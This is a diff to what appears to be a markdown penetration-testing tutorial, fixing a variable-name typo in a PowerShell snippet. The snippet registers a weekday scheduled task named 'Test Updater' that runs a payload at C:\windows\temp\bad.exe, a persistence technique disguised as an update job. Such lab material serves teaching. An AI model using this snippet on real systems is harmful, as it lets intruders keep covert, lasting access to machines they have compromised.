@@ -97,11 +97,11 @@ On your attack box with the editor of your choice copy the following
 ```ps
 $payloadpath = "C:\windows\temp\bad.exe"
 $taskname = "Test Updater"
-$tskdescription = "This task updates things."
+$taskdescription = "This task updates things."
 $action = New-ScheduledTaskAction -Execute $payloadpath
 $days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
 $trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 8am
-Register-ScheduledTask -Action $action -Trigger $trigger -Taskname $taskname -Description $tskdescription
+Register-ScheduledTask -Action $action -Trigger $trigger -Taskname $taskname -Description $taskdescription
 ```
 > Learn more about powershell `New-ScheduledTaskTrigger` [here](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2022-ps)
 
